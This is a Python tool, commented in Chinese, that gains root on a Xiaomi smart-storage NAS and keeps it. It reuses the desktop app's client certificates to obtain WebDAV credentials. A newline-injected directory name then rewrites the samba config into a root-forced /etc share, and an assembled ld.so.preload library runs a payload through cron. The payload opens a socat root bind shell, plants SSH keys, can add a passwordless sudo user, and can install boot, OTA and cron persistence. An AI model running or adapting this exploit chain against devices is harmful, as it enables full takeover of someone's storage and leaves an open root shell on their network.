#!/usr/bin/env python3
"""
xiaomi-nas-root.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 root & SSH 持久化
参照 kid0114/xiaomi-nas-ssh-root-tool 的使用形态，攻击链为 uci heredoc 注入。

用法:
    python xiaomi-nas-root.py <NAS_IP>
    python xiaomi-nas-root.py <NAS_IP> --uid <米家数字UID>
    python xiaomi-nas-root.py <NAS_IP> --cert-dir "C:\\Users\\you\\AppData\\Local\\minasCert"
    python xiaomi-nas-root.py <NAS_IP> --persist
    python xiaomi-nas-root.py <NAS_IP> --persist --sudo-user phirmu

前置条件:
    1. 本机已安装"小米智能存储"桌面端并登录过 NAS（证书目录默认自动查找）
    2. 依赖: python3 (标准库), keystone-engine, smbprotocol[kerberos] (pip install -r requirements.txt)

攻击链 (三步):
    ① mTLS 证书 → get_pool_info 拿 WebDAV 凭据 (自动探测服务端真实 CN，解决非主账号 UID mismatch 握手失败)
    ② WebDAV MKCOL 换行目录名 + netshare/add_samba_account uci heredoc 注入
       → force user=root 的 SMB /etc 共享 (通过 python-smbclient 实现跨平台免 root 写入，适配 etc-<uid> 共享名)
    ③ /etc/ld.so.preload + aarch64 触发 .so (keystone 现场汇编)
       → cron 每分钟 root 任务执行 → 动态 bind-mount 解除 mi-shell 限制 → 装配 socat(2323) + dropbear(22)
       → 可选部署 /data/auto_ssh 三重自愈体系（开机自启、官方 OTA 升级防清理、crontab 保活）及持久化 sudo 用户。
"""
import argparse
import base64
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse

SHELL_PORT = 2323

CERT_SEARCH = [
    os.path.expandvars(r"%LOCALAPPDATA%\minasCert") if os.name == "nt" else None,
    os.path.expanduser("~/AppData/Local/minasCert"),
    "/Applications/小米智能存储.app/Contents/Resources/extraResources/cert",
]

STEP = [0]


def log(kind, msg):
    colors = {"ok": "\033[32m", "warn": "\033[33m", "fail": "\033[31m", "info": ""}
    reset = "\033[0m"
    if kind == "step":
        STEP[0] += 1
        print("\n\033[1m[%02d] %s\033[0m" % (STEP[0], msg))
        return
    c = colors.get(kind, "")
    print("     %s%s: %s%s" % (c, kind.upper(), msg, reset))


def die(msg):
    log("fail", msg)
    sys.exit(1)


def find_cert_dir(explicit):
    if explicit:
        return explicit if os.path.isdir(explicit) else None
    for d in CERT_SEARCH:
        if d and os.path.isdir(d):
            pems = [f for f in os.listdir(d) if f.endswith("_cert.pem")]
            if pems:
                return d
    # broad search on windows
    for base in [os.path.expandvars(r"%LOCALAPPDATA%"), os.path.expandvars(r"%APPDATA%")]:
        if not base or "%" in base or not os.path.isdir(base):
            continue
        cand = os.path.join(base, "minasCert")
        if os.path.isdir(cand):
            return cand
    return None


class Nas:
    def __init__(self, ip, cert_dir):
        self.ip = ip
        self.cert_dir = cert_dir
        pems = [f for f in os.listdir(cert_dir) if f.endswith("_cert.pem")]
        if not pems:
            die("no *_cert.pem in %s" % cert_dir)
        self.base = pems[0][:-len("_cert.pem")]
        self.ca = os.path.join(cert_dir, "ca_chain.pem")
        self.cert = os.path.join(cert_dir, pems[0])
        self.key = os.path.join(cert_dir, self.base + "_private_key.pem")

        # 解析客户端证书中的 UID 与设备标识
        der = base64.b64decode(b"".join(
            open(self.cert, "rb").read().splitlines()[1:-1]))
        match = re.search(rb"nas\.([0-9]+)\.([0-9a-f]+)", der)
        if match:
            client_uid = match.group(1).decode()
            did = match.group(2).decode()
            prefix = f"nas.{client_uid}.{did}"
        else:
            client_uid = self.base.split("_")[0]
            prefix = f"nas.{client_uid}"

        self.uid = client_uid
        self.sn = None

        # 方式 1: 直接向 NAS 发起 mTLS 连接（不校验主机名），从服务端返回的证书中读取服务端真实的 Common Name
        # 解决共享成员/非首个账号客户端证书 UID 与服务端设备所有者 UID 不一致导致 Hostname mismatch 的问题
        try:
            probe = ssl.create_default_context(cafile=self.ca)
            probe.check_hostname = False
            probe.load_cert_chain(str(self.cert), str(self.key))
            with socket.create_connection((ip, 443), timeout=8) as raw:
                with probe.wrap_socket(raw) as ps:
                    peer_cert = ps.getpeercert() or {}
                    for rdn in peer_cert.get("subject", ()):
                        for k, v in rdn:
                            if k == "commonName" and v.startswith("nas."):
                                self.sn = v
                                break
                        if self.sn:
                            break
                    if not self.sn:
                        for k, v in peer_cert.get("subjectAltName", ()):
                            if k == "DNS" and v.startswith("nas."):
                                self.sn = v
                                break
        except Exception:
            pass

        # 验证探测到的 self.sn 是否可用
        if self.sn:
            try:
                vctx = ssl.create_default_context(cafile=self.ca)
                vctx.load_cert_chain(str(self.cert), str(self.key))
                with socket.create_connection((ip, 443), timeout=8) as vraw:
                    with vctx.wrap_socket(vraw, server_hostname=self.sn) as vps:
                        vps.sendall(b"")
            except Exception:
                self.sn = None

        # 方式 2: 若方式 1 未获取到可用 SN，逐个尝试常见角色后缀
        if not self.sn:
            for role in ("0", "00", "1", "2", "20"):
                candidate = f"{prefix}.{role}"
                raw = None
                try:
                    probe = ssl.create_default_context(cafile=self.ca)
                    probe.load_cert_chain(str(self.cert), str(self.key))
                    raw = socket.create_connection((ip, 443), timeout=8)
                    with probe.wrap_socket(raw, server_hostname=candidate) as ps:
                        ps.sendall(b"")  # 握手成功即可
                    self.sn = candidate
                    break
                except Exception:
                    if raw is not None:
                        try:
                            raw.close()
                        except OSError:
                            pass
                    continue

        if not self.sn:
            die("no working server CN (probe and .0/.00/.1/.2/.20 suffixes failed)")

        self.ctx = ssl.create_default_context(cafile=self.ca)
        self.ctx.load_cert_chain(self.cert, self.key)

    def https(self, path, body=None, timeout=15):
        raw = socket.create_connection((self.ip, 443), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        if body is not None:
            if isinstance(body, (dict, list)):
                body = json.dumps(body).encode()
            elif isinstance(body, str):
                body = body.encode()
            req = ("POST %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n"
                   "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n" % (path, len(body))).encode() + body
        else:
            req = ("GET %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n\r\n" % path).encode()
        s.sendall(req)
        chunks = []
        s.settimeout(timeout)
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            idle = 0
            chunks.append(d)
        s.close()
        return b"".join(chunks)

    def json_body(self, resp):
        if isinstance(resp, str):
            resp = resp.encode("utf-8", "surrogateescape")
        i = resp.find(b"\r\n\r\n")
        head, b = resp[:i], resp[i + 4:]
        status = head.split(b"\r\n")[0].decode("utf-8", "replace") if i >= 0 else ""
        if i >= 0 and b"chunked" in head.lower():
            out = b""
            while b:
                m = re.match(rb"([0-9a-fA-F]+)\r\n", b)
                if not m:
                    break
                size = int(m.group(1), 16)
                if size == 0:
                    break
                b = b[m.end():]
                out += b[:size]
                b = b[size + 2:]
            b = out
        text = b.decode("utf-8", "replace")
        try:
            parsed = json.loads(text.strip())
            if isinstance(parsed, dict):
                parsed["http_status"] = status.strip()
            return parsed
        except Exception:
            return {"raw": text[:200], "http_status": status.strip()}

    def webdav(self, method, path, body=None, auth=None, timeout=20):
        raw = socket.create_connection((self.ip, 5000), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        hdrs = {"Host": "n", "Connection": "close"}
        if auth:
            hdrs["Authorization"] = auth
        if body is not None:
            if isinstance(body, str):
                body = body.encode()
            hdrs["Content-Length"] = str(len(body))
        req = "%s %s HTTP/1.1\r\n" % (method, path)
        req += "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items()) + "\r\n"
        s.sendall(req.encode())
        if body is not None:
            s.sendall(body)
        chunks = []
        s.settimeout(timeout)
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            chunks.append(d)
        s.close()
        return b"".join(chunks).decode("utf-8", "replace")


def build_trigger_so(path_out):
    """assemble minimal aarch64 ET_DYN .so whose DT_INIT forks /bin/sh /etc/.rootpwn.sh"""
    try:
        from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN
    except ImportError:
        die("keystone-engine missing: pip install keystone-engine")
    import struct

    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    asm = (
        "init_fn:\n"
        "    mov x0, #17\n"
        "    mov x1, xzr\n"
        "    mov x2, xzr\n"
        "    mov x3, xzr\n"
        "    mov x4, xzr\n"
        "    mov x8, #220\n"
        "    svc #0\n"
        "    cbnz x0, done\n"
        "    adr x0, str_sh\n"
        "    adr x5, str_script\n"
        "    stp x0, x5, [sp, #-32]!\n"
        "    str xzr, [sp, #16]\n"
        "    mov x1, sp\n"
        "    mov x2, xzr\n"
        "    mov x8, #221\n"
        "    svc #0\n"
        "    mov x8, #93\n"
        "    mov x0, #127\n"
        "    svc #0\n"
        "done:\n"
        "    ret\n"
        "str_sh:\n"
        '    .ascii "/bin/sh\\0"\n'
        "str_script:\n"
        '    .ascii "/etc/.rootpwn.sh\\0"\n'
    )
    enc, cnt = ks.asm(asm)
    code = bytes(enc)

    NUM_PH = 2
    code_va = 0x1000
    data = bytearray(b"\x00" * 0x1000)
    data[code_va:code_va + len(code)] = code
    strtab_off = code_va + len(code)
    data += b"\x00"
    symtab_off = strtab_off + 1
    data += b"\x00" * 24
    dyn_off = symtab_off + 24

    dyn = b""
    dyn += struct.pack("<qQ", 12, code_va)      # DT_INIT
    dyn += struct.pack("<qQ", 5, strtab_off)    # DT_STRTAB
    dyn += struct.pack("<qQ", 6, symtab_off)    # DT_SYMTAB
    dyn += struct.pack("<qQ", 10, 1)            # DT_STRSZ
    dyn += struct.pack("<qQ", 11, 24)           # DT_SYMENT
    dyn += struct.pack("<qQ", 0, 0)             # DT_NULL
    data += dyn
    file_size = len(data)

    data[0:4] = b"\x7fELF"
    data[4] = 2
    data[5] = 1
    data[6] = 1
    struct.pack_into("<HHIQQQIHHHHHH", data, 16, 3, 0xB7, 1, 0, 64, 0, 0, 64, 56, NUM_PH, 0, 0, 0)

    def phdr(off, p_type, flags, off_in_file, filesz):
        data[off:off + 56] = struct.pack("<IIQQQQQQ", p_type, flags, off_in_file, off_in_file,
                                         off_in_file, filesz, filesz, 0x1000)

    phdr(64, 1, 5, 0, file_size)
    phdr(120, 2, 4, dyn_off, len(dyn))
    open(path_out, "wb").write(bytes(data))
    return file_size


def ssh_key_path():
    p = os.path.expanduser("~/.ssh/id_ed25519_minas")
    os.makedirs(os.path.dirname(p), exist_ok=True)
    if not os.path.exists(p):
        r = subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", p, "-N", "", "-C", "minas-root"],
                           capture_output=True)
        if r.returncode != 0:
            die("ssh-keygen failed: %s" % r.stderr.decode(errors="replace"))
        log("ok", "generated new key %s" % p)
    return p


def tcp_open(ip, port, timeout=3):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def _smb_write_file(share, name, data, password):
    """经 root SMB 共享写文件（WebDAV 拒绝 /etc，实测 451）。
    优先使用 python-smbclient（跨平台免 root 权限），回退 Windows net use 或 POSIX cifs 挂载。"""
    shares = [share] if isinstance(share, str) else list(share)
    last_err = None

    for cur_share in shares:
        clean = cur_share.replace("\\", "/").strip("/")
        parts = clean.split("/", 1)
        ip = parts[0]
        share_name = parts[1] if len(parts) > 1 else ""
        uid = share_name.rsplit("-", 1)[-1] if "-" in share_name else ""

        # 1. 优先使用纯 Python smbclient
        try:
            import smbclient
            try:
                smbclient.register_session(ip, username="u" + uid, password=password)
                path = f"//{ip}/{share_name}/{name}"
                with smbclient.open_file(path, mode="wb") as f:
                    f.write(data)
                return
            finally:
                try:
                    smbclient.delete_session(ip)
                except Exception:
                    pass
        except Exception as exc:
            last_err = exc

        # 2. Windows 环境下走 UNC 路径或 net use
        if os.name == "nt":
            unc = f"\\\\{ip}\\{share_name}\\{name}"
            win_share = f"\\\\{ip}\\{share_name}"
            try:
                with open(unc, "wb") as f:
                    f.write(data)
                return
            except OSError:
                pass
            subprocess.run(["net", "use", win_share, "/user:u" + uid, password],
                           capture_output=True, timeout=30)
            try:
                with open(unc, "wb") as f:
                    f.write(data)
                return
            except OSError as exc:
                last_err = exc
            finally:
                subprocess.run(["net", "use", win_share, "/delete"], capture_output=True, timeout=30)

        # 3. POSIX: 尝试 cifs 挂载
        import tempfile
        mnt = tempfile.mkdtemp()
        cifs_share = f"//{ip}/{share_name}"
        res = subprocess.run(["mount", "-t", "cifs", cifs_share, mnt,
                              "-o", "username=u{},".format(uid) + "password=" + password],
                             capture_output=True, timeout=30)
        if res.returncode == 0:
            try:
                with open(os.path.join(mnt, name), "wb") as f:
                    f.write(data)
                return
            except OSError as exc:
                last_err = exc
            finally:
                subprocess.run(["umount", mnt], capture_output=True, timeout=30)
                try:
                    os.rmdir(mnt)
                except OSError:
                    pass
        else:
            last_err = OSError("mount: " + res.stderr.decode(errors="replace")[:200])
            try:
                os.rmdir(mnt)
            except OSError:
                pass

    raise OSError("SMB write failed: %s" % last_err)


def _disarm_command(uid, weird_name):
    """清理命令（成功与失败路径共用）。覆盖：preload/payload 文件、staging 怪名目录、
    注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
    return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
            "rm -rf '/home/u%s/pool0/data/%s'; "
            "uci delete sambashare.u%s_2; uci commit sambashare; "
            "uci delete sambauser.u%s_2 2>/dev/null; uci commit sambauser; "
            "sed -i '/sambau%s/d' /etc/passwd /etc/shadow 2>/dev/null; "
            "nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null; "
            "echo CLEAN_OK"
            ) % (uid, weird_name.replace("'", "'\\''"), uid, uid, uid)


def _cleanup_via_shell(args, disarm):
    """经 socat root shell 真正执行清理（成功与失败路径均调用）。"""
    try:
        if tcp_open(args.ip, args.shell_port, timeout=3):
            b64 = base64.b64encode(disarm.encode()).decode()
            feed = "echo %s | base64 -d | bash" % b64
            # 优先使用 Python 直连 socket 发送清理命令
            try:
                with socket.create_connection((args.ip, args.shell_port), timeout=10) as s:
                    s.settimeout(15)
                    s.sendall(f"{feed}\nexit\n".encode())
                    buf = b""
                    while True:
                        try:
                            chunk = s.recv(4096)
                            if not chunk:
                                break
                            buf += chunk
                            if b"CLEAN_OK" in buf:
                                log("ok", "清理完成（preload/共享/staging 已清除）")
                                return
                        except socket.timeout:
                            break
            except Exception:
                pass

            import subprocess as sp
            try:
                if os.name == "nt":
                    res = sp.run(["wsl", "bash", "-c",
                                  f"printf '{feed}\\nexit\\n' | timeout 30 nc {args.ip} {args.shell_port}"],
                                 capture_output=True, text=True, timeout=60, encoding="utf-8",
                                 errors="replace")
                else:
                    res = sp.run(["bash", "-c",
                                  f"printf '{feed}\\nexit\\n' | timeout 30 nc {args.ip} {args.shell_port}"],
                                 capture_output=True, text=True, timeout=60, encoding="utf-8",
                                 errors="replace")
                if "CLEAN_OK" in (res.stdout or ""):
                    log("ok", "清理完成（preload/共享/staging 已清除）")
                    return
            except (OSError, sp.TimeoutExpired) as exc:
                log("warn", "清理执行异常（%s），降级到手动方式" % type(exc).__name__)
        _dump_manual_cleanup(args, disarm)
    except Exception as exc:  # 清理自身绝不能成为崩溃点
        log("warn", "清理流程异常（%s），请手动执行" % type(exc).__name__)
        _dump_manual_cleanup(args, disarm)


def _dump_manual_cleanup(args, disarm):
    """完整清理命令落地：写本地 cleanup-<ip>.sh（用户可经 SMB root 共享上传后 bash 执行），
    并全量打印（不截断）。"""
    try:
        script = "#!/bin/sh\n# xiaomi-nas-root-tool cleanup for %s\n%s\n" % (args.ip, disarm)
        local = "cleanup-%s.sh" % args.ip
        with open(local, "w", newline="\n") as f:
            f.write(script)
        log("warn", "自动清理不可用；完整清理命令已写入 %s（可经 SMB root 共享上传到 /etc 后执行）" % local)
    except OSError:
        pass
    print()
    log("warn", "手动清理命令（完整，任一 root 通道执行）：")
    print("    " + disarm)


def main():
    ap = argparse.ArgumentParser(description="Xiaomi NAS one-click root & persistence tool (RP05, fw 1.0.9.x)")
    ap.add_argument("ip", help="Xiaomi NAS IP address")
    ap.add_argument("--uid", default=None, help="mi UID digits (default: parsed from cert)")
    ap.add_argument("--cert-dir", default=None, help="client cert dir (auto-searched by default)")
    ap.add_argument("--shell-port", type=int, default=SHELL_PORT, help="socat root shell port (default: 2323)")
    ap.add_argument("--persist", action="store_true", help="deploy /data/auto_ssh persistence (systemd, OTA hook, cron)")
    ap.add_argument("--sudo-user", default=None, help="create persistent sudo user (home in /data/<user>)")
    args = ap.parse_args()

    log("step", "定位客户端证书")
    cert_dir = find_cert_dir(args.cert_dir)
    if not cert_dir:
        die("cert dir not found; pass --cert-dir (App 安装目录下 minasCert)")
    log("ok", cert_dir)

    nas = Nas(args.ip, cert_dir)
    if args.uid:
        nas.uid = args.uid
    log("ok", "uid=%s sn=%s" % (nas.uid, nas.sn))

    # ---------- ① get WebDAV creds ----------
    log("step", "mTLS 获取 WebDAV 凭据 (get_pool_info)")
    j = nas.json_body(nas.https("/cgi-bin/luci/filemgr/get_pool_info", {"selector": ["webDAV"]}))
    wd = (j.get("data") or {}).get("webDAV") or {}
    if not wd.get("username"):
        die("get_pool_info failed: %s" % j)
    if not args.uid and wd["username"].startswith("u"):
        nas.uid = wd["username"][1:]
        log("info", "根据 WebDAV 凭据同步 UID=%s" % nas.uid)
    auth = "Basic " + base64.b64encode(("%s:%s" % (wd["username"], wd["password"])).encode()).decode()
    log("ok", "webdav user=%s port=%s (密码不显示)" % (wd["username"], wd.get("port")))

    # ---------- ② uci heredoc injection → root share ----------
    log("step", "uci 注入: 建立 force user=root 的 /etc SMB 共享")
    NL = chr(10)
    Q = chr(34)
    M30 = "M" * 30
    weird_name = (
        M30 + NL + Q + NL +
        "set sambashare.u%s_2.user_force=root" % nas.uid + NL +
        "set sambashare.u%s_2.create_mask=0644" % nas.uid + NL +
        "set sambashare.u%s_2.path=etc" % nas.uid + NL +
        "set sambashare.u%s_2.comment=" % nas.uid
    )
    enc = urllib.parse.quote(weird_name, safe="")
    # /pool0 为单池默认布局（get_pool_info 的 data_dir 即 /pool0/data）；多池设备需按实际调整
    r = nas.webdav("MKCOL", "/pool0/data/" + enc + "/", auth=auth)
    status = r.split("\r\n")[0]
    if not status.startswith("HTTP/1.1 201") and not status.startswith("HTTP/1.1 405"):
        die("MKCOL failed: %s" % status)
    log("ok", "staging dir created (newline-injected name)")

    weird_real = "/home/u%s/pool0/data/%s" % (nas.uid, weird_name)
    # 临时 SMB 口令每次运行随机生成（限内网、窗口仅几分钟，固定口令改为随机的防御纵深）
    import secrets
    smb_password = "Rp!" + secrets.token_urlsafe(12)
    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/add_samba_account",
                                {"username": "u" + nas.uid, "password": smb_password,
                                 "share_dir": [weird_real]}, timeout=60))
    if j.get("code") not in (0, None):
        j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
                                    {"id": "2", "username": "u" + nas.uid, "password": smb_password,
                                     "share_dir": [weird_real]}, timeout=90))
    code = j.get("code")
    log("info" if code in (0, None) else "warn", "add_samba_account code=%s (2502 restart-fail 可继续)" % code)
    time.sleep(5)

    # repair: point share to clean /etc path via set (keeps user_force=root)
    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
                                {"id": "2", "username": "u" + nas.uid, "password": smb_password,
                                 "share_dir": ["/etc"]}, timeout=120))
    if j.get("code") not in (0, None) or " 20" not in j.get("http_status", ""):
        die("share repair failed: %s" % j)
    log("ok", "SMB /etc share active as user u%s (force user=root)" % nas.uid)

    # ---------- ③ preload trigger ----------
    log("step", "写入 /etc/ld.so.preload + 触发 .so (cron 每分钟生效)")
    keyp = ssh_key_path()
    pubkey = open(keyp + ".pub").read().strip()

    so_local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn_trigger.so")
    build_trigger_so(so_local)
    log("ok", "trigger .so assembled (%d bytes)" % os.path.getsize(so_local))

    payload_lines = [
        "#!/bin/sh",
        "rm -f /etc/ld.so.preload",
        "echo \"PWN $(date) uid=$(id -u)\" >> /etc/.rootpwn.log",
        "mkdir -p /home/rootx/.ssh /etc/dropbear",
        "grep -q minas-root /home/rootx/.ssh/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /home/rootx/.ssh/authorized_keys",
        "grep -q minas-root /etc/dropbear/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /etc/dropbear/authorized_keys",
        "chmod 700 /home/rootx/.ssh /etc/dropbear",
        "chmod 600 /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys",
        "sed -i 's#^root:x:0:0:root:/root:#root:x:0:0:root:/home/rootx:#' /etc/passwd 2>/dev/null",
        "sed -i 's#:/usr/sbin/mi-shell$#:/usr/bin/bash#' /etc/passwd 2>/dev/null",
        "grep -q '^/bin/bash$' /etc/shells 2>/dev/null || echo '/bin/bash' >> /etc/shells",
        "grep -q '^/usr/bin/bash$' /etc/shells 2>/dev/null || echo '/usr/bin/bash' >> /etc/shells",
        "mountpoint -q /usr/sbin/mi-shell || mount --bind /bin/bash /usr/sbin/mi-shell 2>/dev/null",
        "systemctl start dropbear.socket 2>/dev/null",
        "pgrep -f TCP-LISTEN:%d >/dev/null || nohup socat TCP-LISTEN:%d,reuseaddr,fork EXEC:\"/bin/bash -li\",pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &" % (args.shell_port, args.shell_port),
        "logger -t rootpwn root-shell-enabled",
    ]

    # 持久化或 sudo 用户配置
    if args.persist or args.sudo_user:
        payload_lines.extend([
            "mkdir -p /data/auto_ssh",
            "grep -q minas-root /data/auto_ssh/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /data/auto_ssh/authorized_keys",
            "chmod 600 /data/auto_ssh/authorized_keys",
            "systemctl enable dropbear.socket 2>/dev/null",
        ])

    if args.sudo_user:
        s_user = args.sudo_user.strip()
        payload_lines.extend([
            f"id {s_user} >/dev/null 2>&1 || useradd -d /data/{s_user} -s /bin/bash {s_user} 2>/dev/null",
            f"mkdir -p /etc/sudoers.d /data/{s_user}/.ssh",
            f"echo '{s_user} ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/{s_user}",
            f"chmod 440 /etc/sudoers.d/{s_user}",
            f"grep -q minas-root /data/{s_user}/.ssh/authorized_keys 2>/dev/null || echo '" + pubkey + f"' >> /data/{s_user}/.ssh/authorized_keys",
            f"chmod 700 /data/{s_user} /data/{s_user}/.ssh",
            f"chmod 600 /data/{s_user}/.ssh/authorized_keys",
            f"chown -R {s_user}:{s_user} /data/{s_user}",
        ])

    if args.persist or args.sudo_user:
        sudo_block = ""
        if args.sudo_user:
            s_user = args.sudo_user.strip()
            sudo_block = f"""
if ! id {s_user} >/dev/null 2>&1; then
    useradd -d /data/{s_user} -s /bin/bash {s_user} 2>/dev/null
fi
if [ ! -f /etc/sudoers.d/{s_user} ]; then
    mkdir -p /etc/sudoers.d
    echo '{s_user} ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/{s_user}
    chmod 440 /etc/sudoers.d/{s_user}
fi
mkdir -p /data/{s_user}/.ssh
chmod 700 /data/{s_user} /data/{s_user}/.ssh
if [ -f "$PUBKEY_BACKUP" ]; then
    while read -r key; do
        [ -n "$key" ] || continue
        grep -q "$key" /data/{s_user}/.ssh/authorized_keys 2>/dev/null || echo "$key" >> /data/{s_user}/.ssh/authorized_keys
    done < "$PUBKEY_BACKUP"
    chmod 600 /data/{s_user}/.ssh/authorized_keys
fi
chown -R {s_user}:{s_user} /data/{s_user}
"""
        keep_script_content = f"""#!/bin/sh
PUBKEY_BACKUP="/data/auto_ssh/authorized_keys"

grep -q "^/bin/bash$" /etc/shells 2>/dev/null || echo "/bin/bash" >> /etc/shells
grep -q "^/usr/bin/bash$" /etc/shells 2>/dev/null || echo "/usr/bin/bash" >> /etc/shells
sed -i "s#^root:x:0:0:root:[^:]*:/usr/sbin/mi-shell#root:x:0:0:root:/home/rootx:/usr/bin/bash#" /etc/passwd 2>/dev/null
sed -i "s#^root:x:0:0:root:/root:#root:x:0:0:root:/home/rootx:#" /etc/passwd 2>/dev/null
sed -i "s#:/usr/sbin/mi-shell$#:/usr/bin/bash#" /etc/passwd 2>/dev/null

if ! mountpoint -q /usr/sbin/mi-shell; then
    mount --bind /bin/bash /usr/sbin/mi-shell 2>/dev/null
fi

mkdir -p /home/rootx/.ssh /etc/dropbear
chmod 700 /home/rootx /home/rootx/.ssh /etc/dropbear
if [ -f "$PUBKEY_BACKUP" ]; then
    while read -r key; do
        [ -n "$key" ] || continue
        grep -q "$key" /home/rootx/.ssh/authorized_keys 2>/dev/null || echo "$key" >> /home/rootx/.ssh/authorized_keys
        grep -q "$key" /etc/dropbear/authorized_keys 2>/dev/null || echo "$key" >> /etc/dropbear/authorized_keys
    done < "$PUBKEY_BACKUP"
    chmod 600 /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys
fi
{sudo_block}
systemctl is-enabled dropbear.socket >/dev/null 2>&1 || systemctl enable dropbear.socket 2>/dev/null
systemctl is-active dropbear.socket >/dev/null 2>&1 || systemctl start dropbear.socket 2>/dev/null
exit 0
"""
        b64_keep = base64.b64encode(keep_script_content.encode()).decode()
        b64_svc = base64.b64encode(b"""[Unit]
Description=Auto Ensure SSH & Bash
DefaultDependencies=no
After=local-fs.target
Before=dropbear.socket dropbear.service

[Service]
Type=oneshot
ExecStart=/bin/sh /data/auto_ssh/keep_ssh.sh
RemainAfterExit=yes

[Install]
WantedBy=sysinit.target multi-user.target
""").decode()
        b64_ota = base64.b64encode(b"""#!/bin/sh
/bin/sh /data/auto_ssh/keep_ssh.sh >/dev/null 2>&1
""").decode()

        payload_lines.extend([
            f"echo {b64_keep} | base64 -d > /data/auto_ssh/keep_ssh.sh",
            "chmod +x /data/auto_ssh/keep_ssh.sh",
            f"echo {b64_svc} | base64 -d > /etc/systemd/system/auto-ssh.service",
            "systemctl daemon-reload 2>/dev/null",
            "systemctl enable auto-ssh.service 2>/dev/null",
            "mkdir -p /etc/syshotplug/ota",
            f"echo {b64_ota} | base64 -d > /etc/syshotplug/ota/90.persist_ssh.sh",
            "chmod +x /etc/syshotplug/ota/90.persist_ssh.sh",
            "grep -q 'keep_ssh.sh' /etc/cron/root 2>/dev/null || echo '* * * * * /bin/sh /data/auto_ssh/keep_ssh.sh >/dev/null 2>&1 #@auto_ssh' >> /etc/cron/root",
        ])

    payload = "\n".join(payload_lines)

    # /etc 写入走 SMB root 共享（WebDAV 路由层拒绝 /etc，实测 451）。
    # 共享经 set_samba_account 指向 /etc 后，名称变为 etc-<uid>，同时加入候选备用
    share = [
        "\\\\%s\\etc-%s" % (args.ip, nas.uid),
        "\\\\%s\\%s-%s" % (args.ip, weird_name[:30], nas.uid),
        "\\\\%s\\etc" % args.ip,
    ]
    disarm = _disarm_command(nas.uid, weird_name)
    try:
        _smb_write_file(share, ".rootpwn.sh", payload.encode(), smb_password)
        _smb_write_file(share, "pwn.so", open(so_local, "rb").read(), smb_password)
        log("ok", "payload + .so written to /etc (SMB root share)")
    except OSError as exc:
        _cleanup_via_shell(args, disarm)
        die("SMB write to %s failed: %s (net use %s /user:u%s %s 手动挂载排查)"
            % (share, exc, share, nas.uid, smb_password))
    try:
        _smb_write_file(share, "ld.so.preload", b"/etc/pwn.so\n", smb_password)
    except OSError as exc:
        _cleanup_via_shell(args, disarm)
        die("arm ld.so.preload failed: %s" % exc)
    log("ok", "ld.so.preload armed — waiting for cron (≤75s)")

    # 触发判据只认 socat 端口
    t0 = time.time()
    got = False
    while time.time() - t0 < 90:
        if tcp_open(args.ip, args.shell_port):
            got = True
            break
        time.sleep(3)

    if not got:
        _cleanup_via_shell(args, disarm)
        die("trigger did not fire in 90s (socat port %d not open); cleanup attempted. "
            "若 22 端口已开或 /etc/.rootpwn.log 有新记录，说明触发实际成功、仅设备缺少 socat——"
            "此时公钥已注入，可走 SSH 认证通道" % args.shell_port)

    log("step", "验证 root 通道")
    ok22 = tcp_open(args.ip, 22)
    ok23 = tcp_open(args.ip, args.shell_port)
    log("ok" if ok22 else "warn", "SSH 22: %s (mi-shell 已解除限制，标准 Bash 可用)" % ("OPEN" if ok22 else "closed"))
    log("ok" if ok23 else "warn", "root shell %d: %s" % (args.shell_port, "OPEN" if ok23 else "closed"))

    # 成功后真正执行清理（经已就绪的 root shell）
    _cleanup_via_shell(args, disarm)

    print()
    print("\033[1m✅ root 获取完成\033[0m")
    print("   root shell:  nc %s %d   (或 wsl: wsl bash -c 'nc %s %d')" % (args.ip, args.shell_port, args.ip, args.shell_port))
    print("   SSH:        ssh -i %s root@%s" % (keyp, args.ip))
    if args.sudo_user:
        print("   Sudo User:  ssh -i %s %s@%s   (免密 sudo, 主目录: /data/%s)" % (keyp, args.sudo_user, args.ip, args.sudo_user))
    if args.persist:
        print("   持久化状态: 已部署 /data/auto_ssh 三重自愈体系 (开机自启/OTA防清/Crontab保活)")
    else:
        print("   会话性质:   未做完整自愈持久化 (公钥与 shell 保持，如需开机全自动恢复请带 --persist)")


if __name__ == "__main__":
    main()
